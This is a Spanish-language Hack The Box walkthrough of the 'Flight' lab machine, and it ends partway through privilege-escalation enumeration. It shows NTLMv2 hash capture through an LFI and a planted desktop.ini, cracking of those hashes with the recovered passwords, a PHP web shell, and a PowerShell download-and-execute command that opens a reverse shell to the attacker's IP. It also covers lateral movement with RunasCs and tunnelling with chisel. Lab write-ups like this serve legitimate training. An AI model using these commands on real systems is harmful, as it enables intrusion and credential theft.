---
layout: single
title: Flight - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Flight de Hackthebox de dificultad dificil vamos a estar consiguiendo hashes ntlmv2 de varios usuarios para ganar acceso ala maquina victima ademas vamos a estar subiendo archivos para tambien ganar acceso ya que tenemos privilegios de escritura en algunos archivos de la maquina por smb para la escalada de privilegios abuseremos de un permiso que tenemos enable y mas"
date: 2023-05-06
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-flight/icon2.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Active Directory
  - Cracking Hashes
  - Hash NTLM
  - SMB Enumeration
---

<p align="center">
<img src="/assets/images/htb-writeup-flight/icon3.jpeg">
</p>

```bash
❯ ping -c 1 10.10.11.187
PING 10.10.11.187 (10.10.11.187) 56(84) bytes of data.
64 bytes from 10.10.11.187: icmp_seq=1 ttl=127 time=103 ms

--- 10.10.11.187 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 103.446/103.446/103.446/0.000 ms
❯ whichSystem.py 10.10.11.187

10.10.11.187 (ttl -> 127): Windows
```

## PortScan 

```bash
❯ nmap -sCV -p53,88,80,135,139,389,445,636,3268,49667,49673,49724 10.10.11.187 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 11:09 CST
Nmap scan report for 10.10.11.187
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-07 00:09:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m54s
| smb2-time: 
|   date: 2023-05-07T00:10:24
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

```
## Enumeracion  

Vamos a usar la herramienta `crackmapexec` para ver ante que estamos y vemos el nombre del dominio que es **flight.htb**

```bash
❯ crackmapexec smb 10.10.11.187
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)

```

Vamos agregarlo al `/etc/hosts`

```bash
❯ echo "10.10.11.187 flight.htb" | sudo tee -a /etc/hosts
10.10.11.187 flight.htb
❯ ping -c 1 flight.htb
PING flight.htb (10.10.11.187) 56(84) bytes of data.
64 bytes from flight.htb (10.10.11.187): icmp_seq=1 ttl=127 time=143 ms

--- flight.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.199/143.199/143.199/0.000 ms
```

Si listamos los recursos compartidos por **smb** y empleamos un **Null session** de momento no podemos ver nada asi que vamos a seguir enumerando la maquina

```bash
❯ smbclient -L 10.10.11.187 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

```

```ruby
❯ whatweb http://10.10.11.187
http://10.10.11.187 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.10.11.187], JQuery[1.4.2], OpenSSL[1.1.1m], PHP[8.1.1], Script[text/javascript], Title[g0 Aviation]
```

Esta es la pagina web que corre en el puerto **80**

![](/assets/images/htb-writeup-flight/web1.png)

Si buscamos por mas subdominios en la maquina encontramos uno nuevo **school.flight.htb** 

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"
```

Vamos agregarlo al `/etc/hosts`

```bash
❯ ping -c 1 school.flight.htb
PING flight.htb (10.10.11.187) 56(84) bytes of data.
64 bytes from flight.htb (10.10.11.187): icmp_seq=1 ttl=127 time=105 ms

--- flight.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 104.703/104.703/104.703/0.000 ms
```

```ruby
❯ whatweb http://school.flight.htb
http://school.flight.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.10.11.187], OpenSSL[1.1.1m], PHP[8.1.1], Title[Aviation School], X-Powered-By[PHP/8.1.1]
```

Esta es la pagina web y bueno en la `url` ya podemos darnos una idea de que tal vez sea vulnerable a `LFI` vamos  a probar

![](/assets/images/htb-writeup-flight/web2.png)

Pero nos detecta

![](/assets/images/htb-writeup-flight/web3.png)

Si apuntamos a la pagina web con `view=index.php` vemos que nos da una respuesta algo rara

![](/assets/images/htb-writeup-flight/web4.png)

Se esta haciendo una peticion por `GET` asi que vamos a hacer una peticion con `curl` a un recurso para ver si nos llega el **hash ntlmv2**

```bash
❯ curl "http://school.flight.htb/index.php?view=//10.10.14.86/test"
```

Con la herramienta `responder` nos vamos a poner en la interfaz `tun0` y nos llega el  `hash

```bash
❯ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.86]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-UXGLJ5F51VJ]
    Responder Domain Name      [SIB7.LOCAL]
    Responder DCE-RPC Port     [45975]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:e67211d7f7146072:C651456AAA11235832A5DBB10696A02E:01010000000000008013613C0F80D90142626E9A48FEF4A30000000002000800530049004200370001001E00570049004E002D005500580047004C004A00350046003500310056004A0004003400570049004E002D005500580047004C004A00350046003500310056004A002E0053004900420037002E004C004F00430041004C000300140053004900420037002E004C004F00430041004C000500140053004900420037002E004C004F00430041004C00070008008013613C0F80D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
```

Ahora vamos a crackearlo y tenemos la contraseña de `svc_apache:S@Ss!K@*t13`

```bash
❯ catn hash
svc_apache::flight:e67211d7f7146072:C651456AAA11235832A5DBB10696A02E:01010000000000008013613C0F80D90142626E9A48FEF4A30000000002000800530049004200370001001E00570049004E002D005500580047004C004A00350046003500310056004A0004003400570049004E002D005500580047004C004A00350046003500310056004A002E0053004900420037002E004C004F00430041004C000300140053004900420037002E004C004F00430041004C000500140053004900420037002E004C004F00430041004C00070008008013613C0F80D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)
1g 0:00:00:11 DONE (2023-05-06 11:40) 0.08361g/s 891547p/s 891547c/s 891547C/s SADSAM..S@29$JL
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Comprobamos que son correctas

```bash
❯ crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```

Ahora sabiendo esto ponemos usar `smbclient` o `smbmap` para ver los recursos compartidos a nivel de red

## SMB svc_apache

Nada interesante

```bash
❯ smbclient -L //10.10.11.187/ -U svc_apache
Password for [WORKGROUP\svc_apache]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shared          Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
	Web             Disk      
SMB1 disabled -- no workgroup available
```

```bash
❯ smbmap -u 'svc_apache' -p 'S@Ss!K@*t13' -H 10.10.11.187
[+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	
```

## Domain Users

Vamos a usar `crackmapexec` para obtener los usuarios del dominio

```bash
❯ crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users | awk '{print $5}' | grep flight
flight.htb\O.Possum
flight.htb\svc_apache
flight.htb\V.Stevens
flight.htb\D.Truff
flight.htb\I.Francis
flight.htb\W.Walker
flight.htb\C.Bum
flight.htb\M.Gold
flight.htb\L.Kein
flight.htb\G.Lors
flight.htb\R.Cold
flight.htb\S.Moon
flight.htb\krbtgt
flight.htb\Guest
flight.htb\Administrator
```

Tambien podemos usar `rpcclient`

```bash
❯ rpcclient 10.10.11.187 -U 'svc_apache%S@Ss!K@*t13' -c enumdomusers | grep -oP "\[.*?\]" | grep -v "0x" | tr -d '[]'
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```

Vamos a usar `crackmapexec` para ver si alguno de estos usuarios reutiliza la contraseña que ya tenemos agrega los usuarios a una lista 

```bash
❯ crackmapexec smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```

El usuario `S.Moon:S@Ss!K@*t13` reutiliza la contraseña 

## User S.Moon 

Podemos escribir en `Shared`

```bash
❯ smbmap -u 'S.Moon' -p 'S@Ss!K@*t13' -H 10.10.11.187
[+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	
```

De momento no hay nada 

```bash
❯ smbclient //10.10.11.187/shared -U S.Moon
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May  6 19:02:41 2023
  ..                                  D        0  Sat May  6 19:02:41 2023

		5056511 blocks of size 4096. 1167339 blocks available
smb: \> 
``` 

Como no sabemos que archivos podemos subir por ejemplo **.php** o **.ini** o algun otro podemos usar esta herramienta que nos crea varios archivos para ya no tener que crearlos desde 0 y subirlos directamente asta ser aceptados

<https://github.com/Greenwolf/ntlm_theft>

<https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini>

```bash
❯ python3 ntlm_theft.py -g all -s 10.10.14.86 -f Gracias
Created: Gracias/Gracias.scf (BROWSE TO FOLDER)
Created: Gracias/Gracias-(url).url (BROWSE TO FOLDER)
Created: Gracias/Gracias-(icon).url (BROWSE TO FOLDER)
Created: Gracias/Gracias.lnk (BROWSE TO FOLDER)
Created: Gracias/Gracias.rtf (OPEN)
Created: Gracias/Gracias-(stylesheet).xml (OPEN)
Created: Gracias/Gracias-(fulldocx).xml (OPEN)
Created: Gracias/Gracias.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: Gracias/Gracias-(includepicture).docx (OPEN)
Created: Gracias/Gracias-(remotetemplate).docx (OPEN)
Created: Gracias/Gracias-(frameset).docx (OPEN)
Created: Gracias/Gracias-(externalcell).xlsx (OPEN)
Created: Gracias/Gracias.wax (OPEN)
Created: Gracias/Gracias.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: Gracias/Gracias.asx (OPEN)
Created: Gracias/Gracias.jnlp (OPEN)
Created: Gracias/Gracias.application (DOWNLOAD AND OPEN)
Created: Gracias/Gracias.pdf (OPEN AND ALLOW)
Created: Gracias/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: Gracias/Autorun.inf (BROWSE TO FOLDER)
Created: Gracias/desktop.ini (BROWSE TO FOLDER)
Generation Complete.

```

Con esto hemos creado un directorio llamado Gracias donde se encuentran todos estos archivos

Vamos a subir el `.ini` primero ya que es un archivo que usa `Windows` y si hay alguien por detras revisando los archivos nos llegara su **hash ntlmv2**

```bash
❯ catn desktop.ini
[.ShellClassInfo]
IconResource=\\10.10.14.86\aa
```

```bash
❯ smbclient //10.10.11.187/shared -U S.Moon
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)
smb: \> 
```

Vamos usar `responder` para ver si nos llega otro hash y si nos llega el `hash` de otro usuario

```bash
❯ responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.86]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-EXDXPM1RBFS]
    Responder Domain Name      [4N6C.LOCAL]
    Responder DCE-RPC Port     [49860]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:560adafc5dad6194:F0D84B7798B9710577010D771417F2A6:010100000000000080950F231680D90190AC29609653BA97000000000200080034004E003600430001001E00570049004E002D00450058004400580050004D003100520042004600530004003400570049004E002D00450058004400580050004D00310052004200460053002E0034004E00360043002E004C004F00430041004C000300140034004E00360043002E004C004F00430041004C000500140034004E00360043002E004C004F00430041004C000700080080950F231680D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000

```

Vamos a crackear el hash 

```bash
❯ catn hash2
c.bum::flight.htb:560adafc5dad6194:F0D84B7798B9710577010D771417F2A6:010100000000000080950F231680D90190AC29609653BA97000000000200080034004E003600430001001E00570049004E002D00450058004400580050004D003100520042004600530004003400570049004E002D00450058004400580050004D00310052004200460053002E0034004E00360043002E004C004F00430041004C000300140034004E00360043002E004C004F00430041004C000500140034004E00360043002E004C004F00430041004C000700080080950F231680D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
❯ john -w:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)
1g 0:00:00:15 DONE (2023-05-06 12:29) 0.06640g/s 699665p/s 699665c/s 699665C/s Timber06..Tiffani29
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

## User c.bum 

Tenemos contraseñas vamos a validar si son correctas con `crackmapexec`

`c.bum:Tikkycoll_431012284`

```bash
❯ crackmapexec smb 10.10.11.187 -u 'c.bum' -p 'Tikkycoll_431012284'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
```

Vamos a ver los recursos compartidos a nivel de red y tenemos permisos de escritura otra vez en **Shared** y ahora tambien en **Web** quiero pensar que **Web** hay estaran los archivos de la pagina web pero para eso tenemos que comprobarlo

```bash
❯ smbmap -u 'c.bum' -p 'Tikkycoll_431012284' -H 10.10.11.187
[+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ, WRITE	
```

Vamos a conectarnos para ver que hay dentro

```bash
❯ smbclient //10.10.11.187/Web -U c.bum
Password for [WORKGROUP\c.bum]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May  6 19:33:58 2023
  ..                                  D        0  Sat May  6 19:33:58 2023
  flight.htb                          D        0  Sat May  6 19:32:01 2023
  school.flight.htb                   D        0  Sat May  6 19:32:01 2023

		5056511 blocks of size 4096. 1166619 blocks available
smb: \> 
```

Vamos a meternos en `flight.htb`

```bash
smb: \flight.htb\> dir
  .                                   D        0  Sat May  6 19:37:01 2023
  ..                                  D        0  Sat May  6 19:37:01 2023
  css                                 D        0  Sat May  6 19:37:01 2023
  images                              D        0  Sat May  6 19:37:01 2023
  index.html                          A     7069  Wed Feb 23 23:58:10 2022
  js                                  D        0  Sat May  6 19:37:01 2023
  
		5056511 blocks of size 4096. 1166475 blocks available
smb: \flight.htb\> 
```

Como la maquina web interpreta `php` podemos subir un archivo `.php` para ganar acceso

```bash
❯ catn reverse.php
<?php
  system($_REQUEST['cmd']);
?>
```

```bash
smb: \flight.htb\> put reverse.php
putting file reverse.php as \flight.htb\reverse.php (0.1 kb/s) (average 0.1 kb/s)
smb: \flight.htb\> 
```

Ahora vemos que si funciona

```bash
❯ curl -s 'http://flight.htb/reverse.php?cmd=whoami'
flight\svc_apache
```

Podemos usar este script <https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1> para ganar acceso ala maquina directamente

```bash
❯ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2023-05-06 12:45:14--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4339 (4.2K) [text/plain]
Grabando a: «Invoke-PowerShellTcp.ps1»

Invoke-PowerShellTcp.ps1        100%[=======================================================>]   4.24K  --.-KB/s    en 0.002s  

2023-05-06 12:45:15 (2.71 MB/s) - «Invoke-PowerShellTcp.ps1» guardado [4339/4339]

```

Solo tenemos que meter una linea al final del script para que nos envie la shell 

```bash
❯ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.86 -Port 443' >> sh.ps1

```

```bash
❯ catn sh.ps1 | tail -n 1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.86 -Port 443
```

Ahora nos montamos un servidor `http` con `python3` 

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Ponte es escucha en el puerto que indicaste por que ahora haremos la peticion para ganar acceso 

```bash
❯ curl -s -X GET -G 'http://flight.htb/reverse.php' --data-urlencode "cmd=cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.86/sh.ps1')"

```

Se hace la peticion

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.187 - - [06/May/2023 12:51:32] "GET /sh.ps1 HTTP/1.1" 200 -

```

## Shell svc_apache

Y ganamos acceso

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.86] from (UNKNOWN) [10.10.11.187] 55592
Windows PowerShell running as user svc_apache on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
flight\svc_apache
PS C:\xampp\htdocs\flight.htb> 
```

Como tenemos la contraseña de otros 2 usuario podemos migrar a `C.bum` podemos usar `RuncasCs` <https://github.com/antonioCoco/RunasCs/releases>

```bash
❯ unzip RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe  
```

Vamos a un directorio donde tengamos capacidad de escritura para descargar los archivos para eso crea un directorio `temp` en la maquina victima 

Para descarganos el **RuncasCs.zip** podemos usar `certutil.exe`

```bash
certutil.exe -urlcache -f -split http://10.10.14.86/RunasCs.exe
****  Online  ****
  0000  ...
  c000
CertUtil: -URLCache command completed successfully.
dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         5/6/2023   7:00 PM          49152 RunasCs.exe                                                           


PS C:\temp> 
```

```bash
   ./RunasCs.exe c.bum Tikkycoll_431012284 "cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.86/sh.ps1')"
```

## Shell c.bum 

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.86] from (UNKNOWN) [10.10.11.187] 55630
Windows PowerShell running as user C.Bum on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
flight\c.bum
PS C:\Windows\system32> 
```

## Remote Port Forwarding 

Despues de usar `winpeas.exe` para enumerar la maquina, la maquina tiene el puerto `8000` por `TCP` abierto y no lo vimos con `nmap` asi que vamos a tener que usar `chisel` para aplicar `Remote Port Forwarding`

```bash
curl.exe -s 127.0.0.1:8000 -I
HTTP/1.1 200 OK
Content-Length: 45949
Content-Type: text/html
Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
Accept-Ranges: bytes
ETag: "03cf42dc9d5d31:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sun, 07 May 2023 02:29:55 GMT
```

<https://github.com/jpillora/chisel/releases/tag/v1.8.1> 

```bash
certutil.exe -urlcache -f -split http://10.10.14.86/chisel.exe   
```

```bash
dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         5/6/2023   7:28 PM        1700664 chisel.exe                                                            
-a----         5/6/2023   7:00 PM          49152 RunasCs.exe                                                           
-a----         5/6/2023   7:14 PM        2027008 winPEASx64.exe                                                        


PS C:\temp> 
```

Vamos a ponernos como servidor desde nuestra maquina de atacante

```bash
❯ ./chisel server --reverse -p 1234
2023/05/06 13:32:19 server: Reverse tunnelling enabled
2023/05/06 13:32:19 server: Fingerprint hFDZilMNfo60BDUFkwa/MYA0F50fY71fHiwdWiCkz7I=
2023/05/06 13:32:19 server: Listening on http://0.0.0.0:1234
```

Nos traemos el puerto **8000** a nuestra maquina

```bash
./chisel.exe client 10.10.14.86:1234 R:8000:127.0.0.1:8000
```

Ahora podemos verlo desde la web 

```bash
❯ ./chisel server --reverse -p 1234
2023/05/06 13:38:27 server: Reverse tunnelling enabled
2023/05/06 13:38:27 server: Fingerprint B7exfu6lDGQ91lZrHuZEZoLcY1LrlI//upGOKp1smYk=
2023/05/06 13:38:27 server: Listening on http://0.0.0.0:1234
2023/05/06 13:43:43 server: session#1: tun: proxy#R:8000=>8000: Listening

```

Esto es lo que hay

![](/assets/images/htb-writeup-flight/web5.png)

Bueno despues de enumerar tenemos capacidad de escritura en este directorio

```bash
icacls .
. flight\C.Bum:(OI)(CI)(W)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
